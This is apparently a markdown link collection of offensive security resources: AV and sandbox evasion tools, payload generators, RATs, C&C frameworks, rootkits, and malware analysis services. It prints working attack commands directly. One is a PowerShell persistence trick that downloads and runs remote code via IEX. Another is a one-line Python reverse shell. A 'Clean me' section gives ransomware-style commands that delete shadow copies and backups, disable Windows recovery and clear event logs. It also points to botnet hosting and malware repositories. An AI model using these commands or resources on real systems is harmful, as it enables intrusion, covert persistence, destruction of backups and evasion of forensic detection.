Virus and other malware
=======================

AntiAV et Sandbox
=================

Sandbox Evasion
---------------

-	Sandbox Evasion Techniques
	1.	https://www.vmray.com/blog/sandbox-evasion-techniques-part-1/
	2.	https://www.vmray.com/blog/sandbox-evasion-techniques-part-2/
	3.	https://www.vmray.com/blog/sandbox-evasion-techniques-part-3/
	4.	https://www.vmray.com/blog/sandbox-evasion-techniques-part-4/

Escape from AV
--------------

-	https://www.exploit-db.com/docs/40900.pdf
-	https://www.exploit-db.com/docs/34591.pdf
-	Malware Analysis
	1.	https://www.vmray.com/analyses/663306/report/overview.html
	2.	https://www.vmray.com/analyses/663310/report/overview.html
	3.	https://www.vmray.com/analyses/663313/report/overview.html
-	http://theinvisiblethings.blogspot.de/2006/06/introducing-blue-pill.html
-	VMWare port: https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1009458
-	https://www.blackhat.com/docs/asia-14/materials/Li/Asia-14-Li-Comprehensive-Virtual-Appliance-Detection.pdf
-	https://www.brokenbrowser.com/detecting-apps-mimetype-malware/
-	https://www.symantec.com/avcenter/reference/Virtual_Machine_Threats.pdf
-	https://www.vmray.com/blog/analyzing-environment-sensitive-malware/
-	Art of Anti Detection
	-	Part 2 : PE Backdoor Manufacturing : https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/
	-	Part 3 : htAtps://www.exploit-db.com/docs/41640.pdf  
-	Command Injection/Elevation � Environment Variables Revisited : http://breakingmalware.com/vulnerabilities/command-injection-and-elevation-environment-variables-revisited/
-	https://n0where.net/antivirus-evasion-framework-veil-framework/ - Antivirus Evasion Framework: Veil Framework replaced by https://github.com/Veil-Framework/Veil
-	IDPS & SandBox & AntiVirus STEALTH KILLER. MorphAES is the world's first polymorphic shellcode engine, with metamorphic properties and capability to bypass sandboxes, which makes it undetectable for an IDPS, it's cross-platform as well and library-independent. https://github.com/cryptolok/MorphAES
-	A framework that create an advanced stealthy dropper that bypass most AVs and have a lot of tricks - https://github.com/D4Vinci/Dr0p1t-Framework
-	Bypass PowerShell execution policy by encoding ps script into bat file - https://github.com/artkond/bat-armor
-	A framework that create an advanced stealthy dropper that bypass most AVs and have a lot of tricks https://github.com/D4Vinci/Dr0p1t-Framework
-	Modifying Metasploit x64 template for AV evasion - https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/
-	AntiVirus Evasion Tool https://github.com/govolution/avet
-	OWASP ZSC - Shellcode/Obfuscate Code Generator http://www.kitploit.com/2017/09/owasp-zsc-shellcodeobfuscate-code.html
	-	OWASP Page: https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
	-	Documents: https://www.gitbook.com/book/ali-razmjoo/owasp-zsc/details
	-	Home: http://zsc.z3r0d4y.com/
	-	Features: http://zsc.z3r0d4y.com/table.html
	-	Github: https://github.com/Ali-Razmjoo/OWASP-ZSC
	-	Archive: https://github.com/Ali-Razmjoo/ZCR-Shellcoder-Archive
	-	Mailing List: https://groups.google.com/d/forum/owasp-zsc
	-	API: http://api.z3r0d4y.com
-	Exe2Png : https://github.com/OsandaMalith/Exe2Image/releases A simple utility to convert EXE files to PNG images and vice versa.
-	How to Create Linux Self Extracting Archive https://n0where.net/how-to-create-self-extracting-archive/ https://gist.github.com/coh7eiqu8thaBu/f2cafb13c1961b6a73853060c987c8af or http://megastep.org/makeself/makeself-2.1.5.run
-	Hide file on ADS http://www.darknessgate.com/security-tutorials/date-hiding/ntfs-alternate-data-streams/
	-	Can be hide in TeamViewer Log : ![How to hide file on ADS](https://pbs.twimg.com/media/DTVR9a5XcAAIZYC.jpg)
-	[Yet another way to hide from Sysinternals’ tools](http://www.hexacorn.com/blog/2018/01/04/yet-another-way-to-hide-from-sysinternals-tools/)
-	[Hiding Metasploit Shellcode to Evade Windows Defender](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)

Download Payload or Payload Generator
-------------------------------------

-	HTML/JS drops & executes base64 encoded executable with PowerShell > HTML/JS no AV detection > Dropped EXE detected https://www.hybrid-analysis.com/sample/3b66f0172d5700924f4749db2b7a6f07eb5b5a18033dc379e48d938789f6bf75?environmentId=100 https://twitter.com/cyb3rops/status/907236450248413190?s=09
-	An example of infected Word doc : http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html
-	A tool to create a JScript file which loads a .NET v2 assembly from memory - https://github.com/tyranid/DotNetToJScript
-	CACTUSTORCH: Payload Generation for Adversary Simulations https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/ / https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/
-	Undetectable Windows Payload Generation with extras Running on Python2.7 https://github.com/nccgroup/winpayloads
-	HERCULES is a special payload generator that can bypass antivirus softwares : https://github.com/EgeBalci/HERCULES
-	Download Payload with DNS https://www.peerlyst.com/posts/transferring-backdoor-payloads-by-dns-aaaa-records-and-ipv6-address-damon-mohammadbagher
-	Public malware techniques used in the wild: Virtual Machine, Emulation, Debuggers, Sandbox detection. https://github.com/LordNoteworthy/al-khaser
-	CHAOS allow generate payloads and control remote Windows systems. [GitHub](https://github.com/tiagorlampert/CHAOS)

Persistance
-----------

-	Persistance one shot\`\`\`

	Dans une première invite de command :
	=====================================

	waitfor persist && PowerShell IEX (IWR http://bit.ly/L3g1t).Content

Dans une autre cela déclence la commande précédente et télécharge la charge
===========================================================================

waitfor /s 127.0.0.1 /si persist

example de charge (http://bit.ly/L3g1t\)
========================================

Write-Host SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION -ForegroundColor Green\`\`\`* Obfuscates compiled java code to make it harder to reverse engineer. https://github.com/CalebWhiting/java-asm-obfuscator* Word add-in persistence found in the wild : "%APPDATA%\Microsoft\word\startup\w.wll" https://mymalwareparty.blogspot.com/2018/01/word-add-in-persistence-found-in-wild.html* Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

Genetic Malware
---------------

-	Obowla https://github.com/Genetic-Malware/Ebowla
-	GoGreen https://github.com/leoloobeek/GoGreen / https://adapt-and-attack.com/2017/11/15/keying-payloads-for-scripting-languages/
-	Simple Polymorphic Engine (SPE32) is a simple polymorphic engine for encrypting code and data. It is an amateur project that can be used to demonstrate what polymorphic engines are. https://www.pelock.com/products/poly-polymorphic-engine - [GitHUB](https://github.com/PELock/Simple-Polymorphic-Engine-SPE32)

Rootkit
-------

-	Userland Rootkit: Azazel https://n0where.net/userland-rootkit-azazel [GitHub](https://github.com/chokepoint/azazel)

IoC
===

-	https://github.com/sroberts/awesome-iocs
-	CERTitude - The seeker of IOC https://github.com/cert-w/certitude/
-	Open Indicators of Compromise: OpenIOC https://n0where.net/open-indicators-of-compromise-openioc/ http://www.openioc.org/
	-	IOC Finder https://www.fireeye.com/services/freeware/ioc-finder.html
	-	IOC Editor https://www.fireeye.com/services/freeware/ioc-editor.htm
	-	IOC Writer https://github.com/mandiant/ioc_writer

AV Check and malware analysis
=============================

-	[No redistribut to AV](https://nodistribute.com/)
-	[VirusTotal](https://www.virustotal.com/)
-	A source for pcap files and malware samples... http://malware-traffic-analysis.net/
-	maltran - A command line tool to download malware exercises from malware-traffic-analysis.net - https://github.com/MalwareReverseBrasil/maltran
-	http://malwareanalysis.tools/ Malware Analysis Tools (mega bookmark !)
-	Tool written in python3 to determine where the AV signature is located in a binary/payload https://github.com/hegusung/AVSignSeek
-	Command line tool for scanning streams within office documents plus xor db attack https://github.com/tylabs/quicksand_lite
-	VirusTotal Wanna Be - Now with 100% more Hipster https://malice.io - https://github.com/maliceio/malice
-	[Interactive online malware analysis service for dynamic and static research of most types of threats using any environments. Replaces a set of tools for research.](https://app.any.run/)
-	Analyzing Linux Malware Sandbox: Limon [GitHub](https://github.com/monnappa22/Limon) and https://n0where.net/analyzing-linux-malware-sandbox-limon
-	[Hybrid Analysis - free malware analysis service for the community that detects and analyzes unknown threats using a unique Hybrid Analysis technology.](https://www.hybrid-analysis.com/)
-	Akana (Android files) http://akana.mobiseclab.org/
-	Binary Guard True Bare Metal http://www.binaryguard.com/
-	Intezer Analyze (Community Edition) https://analyze.intezer.com/
-	Comodo Valkyrie http://valkyrie.comodo.com/
-	Detux Sandbox (Linux binaries) http://detux.org/
-	Joe Sandbox Cloud (Community Edition) https://www.joesandbox.com/
-	Malwr (also see MalwareViz) https://malwr.com/submission/ and https://www.malwareviz.com/
-	http://sandbox.pikker.ee/
-	SecondWrite (free version) https://www.secondwrite.com/product/free-subscription/
-	ThreatExpert http://www.threatexpert.com/submit.aspx
-	ThreatTrack http://www.threattracksecurity.com/resources/sandbox-malware-analysis.aspx
-	ViCheck https://www.vicheck.ca/
-	[PEpper](https://github.com/Th3Hurrican3/PEpper) - An Open Source Script To Perform Malware Static Analysis On Portable Executable

RAT and other spyware
=====================

-	HTTPS-based Remote Administration Tool (RAT) https://github.com/t3ntman/CrunchRAT
-	outis is a custom Remote Administration Tool (RAT) or something like that. It was build to support various transport methods (like DNS) and platforms (like Powershell). http://www.kitploit.com/2017/09/outis-custom-remote-administration-tool.html https://github.com/SySS-Research/outis
-	Ar3s Python botnet and backdoor https://github.com/coh7eiqu8thaBu/Ares
-	CHAOS Framework allow generate payloads and control remote machines. https://github.com/tiagorlampert/CHAOS
-	Python Reverse Shell in 124 Characters`
	import socket as o,subprocess as u
	s=o.socket()
	s.connect(('0.0.0.0',1337))
	c=http://u.call (["sh","-i"],stdin=s,stdout=s,stderr=s)
	`
-	TeleShadow - Telegram Desktop Session Stealer (Windows) [Teleshadow2- Advanced Telegram Desktop Session Hijacker!](https://github.com/ParsingTeam/TeleShadow2)
-	[Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python](https://github.com/n1nj4sec/pupy)

C&C
---

-	[A fully featured backdoor that uses Gmail as a C&C server](https://github.com/byt3bl33d3r/gcat)
-	Fully Featured Backdoor Telegram C&C: BrainDamage https://n0where.net/fully-featured-backdoor-telegram-cc-braindamage/ https://github.com/mehulj94/BrainDamage
-	Tunneling C&C Over DNS: dnscat2. This tool is designed to create a command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network. https://n0where.net/tunneling-cc-over-dns-dnscat2 [GitHub](https://github.com/iagox86/dnscat2)
-	TLS C2 https://gist.github.com/caseysmithrc/a4c4748160ff9c782d8a86723dbc7334
-	Active Directory as a C2 (Command & Control) https://akijosberryblog.wordpress.com/2018/03/17/active-directory-as-a-c2-command-control/
-	Create your own Private Botnet with ProxyDock! https://0x00sec.org/t/create-your-own-private-botnet-with-proxydock/5917
-	[goDoH](https://github.com/sensepost/goDoH) - A DNS-over-HTTPS C2

Android
=======

-	AhMyth Android RAT is an Android Remote Administration Tool - http://www.kitploit.com/2017/07/ahmyth-android-rat-android-remote.html https://github.com/AhMyth/AhMyth-Android-RAT/releases
-	Bypassing Android’s Network Security Configuration https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/november/bypassing-androids-network-security-configuration/

Linux
=====

-	[In-Memory-Only ELF Execution (Without tmpfs)](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)

References
----------

-	https://developer.android.com/training/articles/security-config.html?hl=en
-	https://ibotpeaches.github.io/Apktool/
-	https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/security/net/config
-	https://malpedia.caad.fkie.fraunhofer.de/ Malpedia
-	[malware.one is a binary substring searchable malware catalog containing terabytes of malicious code.](https://malware.one/index.php?action=login)
-	APT & CyberCriminal Campaign Collection https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections

Big package or Framework
========================

-	Small and highly portable detection tests : atomic-red-team https://github.com/redcanaryco/atomic-red-team
-	Malwares :
	-	[GitHub](https://malwares.github.io)
	-	[Web Site](https://malwares.github.io/)
	-	Database on [Mega](https://mega.nz/#F!IhFg2ZbI!9DgoYtpyPTPhw6b1veuTkg)
-	[Nice Repo ransomwares,RATs,Malwares,..etc](https://mqnvhg6lht7lc3nc.onion/)
-	[A list of collection of Malware](http://www.megabeets.net/fantastic-malware-and-where-to-find-them/)

Clean me ...
============

-	deletes all possible shadow copies on the system `C:\Windows\system32\cmd.exe /c c:\Windows\system32\vssadmin.exe delete shadows /all /quiet`
-	deletes all windows backup `C:\Windows\system32\cmd.exe /c wbadmin.exe delete catalog -quiet`
-	ensure that the Windows recovery console does not attempt to repair anything on the host `C:\Windows\system32\cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no`
-	deletion of the System & Security windows event log `C:\Windows\system32\cmd.exe /c wevtutil.exe cl System` and `C:\Windows\system32\cmd.exe /c wevtutil.exe cl Security`

Other
=====

-	[Build a Compiler Bomb](https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb/69193#69193)
-	[A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb/]
-	Malware Development – Welcome to the Dark Side
	-	[Part 1](https://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-1/)
	-	[Part 2.1](https://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-2-1/)
	-	[Part 2.2](https://niiconsulting.com/checkmate/2018/03/malware-development-welcome-dark-side-part-2-2/)
	-	[Part 3](https://niiconsulting.com/checkmate/2018/03/malware-development-welcome-dark-side-part-3/)
	-	[Part 4](https://niiconsulting.com/checkmate/2018/03/malware-development-welcome-to-the-dark-side-part-4/)

Malware analysis
================

-	The [Malware Capture Facility Project](https://mcfp.weebly.com/) is an effort from the Czech Technical University ATG Group for capturing, analyzing and publishing real and long-lived malware traffic.
-	The [Stratosphere IPS](https://www.stratosphereips.org/datasets-overview) feeds itself with models created from real malware traffic captures. By using and studying how malware behaves in reality, we ensure the models we create are accurate and our measurements of performance are real. Our sister project, Malware Capture Facility Project, is in charge of continuously monitoring the threat landscape for new emerging threats, retrieving malicious samples and running them in our facilities to capture the traffic

Hosting
=======

-	https://access.clientleaf.ru/index.php/ BotNet ONLY

Example of Malware
==================

-	https://pastebin.com/7BDV11Ah
